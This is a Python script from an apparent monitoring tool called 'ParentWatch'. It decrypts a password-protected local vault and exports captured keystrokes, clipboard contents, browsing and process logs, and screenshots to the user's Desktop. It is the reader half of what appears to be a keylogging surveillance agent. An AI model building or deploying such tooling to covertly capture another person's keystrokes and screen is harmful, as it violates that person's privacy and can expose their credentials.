# read_vault.py — run this to read all stored logs in plain text

import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from pathlib import Path
from vault.vault_manager import init_vault, vault_read_all, vault_read_screenshot
import config


def main():
    print("=" * 60)
    print("  PARENTWATCH VAULT READER")
    print("=" * 60)

    vault_dir = config.VAULT_DIR

    if not vault_dir.exists():
        print(f"\n[!] Vault folder not found at: {vault_dir}")
        print("    Agent may not have run yet.")
        input("\nPress Enter to exit.")
        return

    password = input("\nEnter vault password: ").strip()

    try:
        key = init_vault(vault_dir, password)
    except Exception as e:
        print(f"\n[!] Failed to open vault: {e}")
        input("Press Enter to exit.")
        return

    entries = vault_read_all(vault_dir, key)

    if not entries:
        print("\n[!] Vault is empty — no logs yet.")
        input("Press Enter to exit.")
        return

    print(f"\n[+] {len(entries)} log entries found.\n")

    # Save to readable text file on Desktop
    out_path = Path(os.path.expanduser("~")) / "Desktop" / "vault_report.txt"
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(f"PARENTWATCH VAULT REPORT\n{'='*60}\n\n")

        categories = {}
        for e in entries:
            categories.setdefault(e["category"], []).append(e)

        for cat in ["browser", "keylog", "clipboard", "process"]:
            if cat not in categories:
                continue
            items = categories[cat]
            f.write(f"\n{'='*60}\n")
            f.write(f"  {cat.upper()}  ({len(items)} entries)\n")
            f.write(f"{'='*60}\n")
            for item in items:
                f.write(f"\n[{item['ts']}]\n{item['text']}\n")
                f.write("-" * 40 + "\n")

    print(f"[+] Report saved to Desktop: vault_report.txt")

    # Export screenshots
    ss_dir = vault_dir / "ss"
    if ss_dir.exists():
        enc_files = list(ss_dir.glob("*.enc"))
        print(f"[+] Screenshots found: {len(enc_files)}")
        if enc_files:
            ss_out = Path(os.path.expanduser("~")) / "Desktop" / "vault_screenshots"
            ss_out.mkdir(exist_ok=True)
            saved = 0
            for f in enc_files:
                try:
                    png = vault_read_screenshot(vault_dir, key, str(f))
                    out = ss_out / (f.stem + ".png")
                    out.write_bytes(png)
                    saved += 1
                except Exception:
                    pass
            print(f"[+] {saved} screenshots saved to Desktop/vault_screenshots/")

    input("\nDone. Press Enter to exit.")


if __name__ == "__main__":
    main()
